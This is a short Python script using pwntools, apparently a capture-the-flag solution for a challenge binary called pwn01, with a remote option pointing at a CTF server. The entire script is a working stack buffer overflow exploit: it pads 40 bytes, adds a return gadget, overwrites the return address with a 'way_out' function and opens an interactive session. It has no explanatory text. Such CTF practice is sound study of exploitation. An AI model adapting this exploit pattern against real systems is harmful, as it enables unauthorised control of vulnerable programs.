#!/usr/bin/env python3

from pwn import *

context.log_level = 'error'
context.binary = elf = ELF('./src/pwn01')
context.arch = 'amd64'
context.endian = 'little'

if args.REMOTE:
    io = remote("pwn01.ctf.teamquark.com", 65301)
else:
    io = elf.process()

io.recvuntil(b'>')

offset = 40
ret_gadget =  0x401016
address = elf.symbols['way_out']

payload = b'A' * offset
payload += pack(ret_gadget)
payload += pack(address)

io.sendline(payload)
io.interactive()
io.close()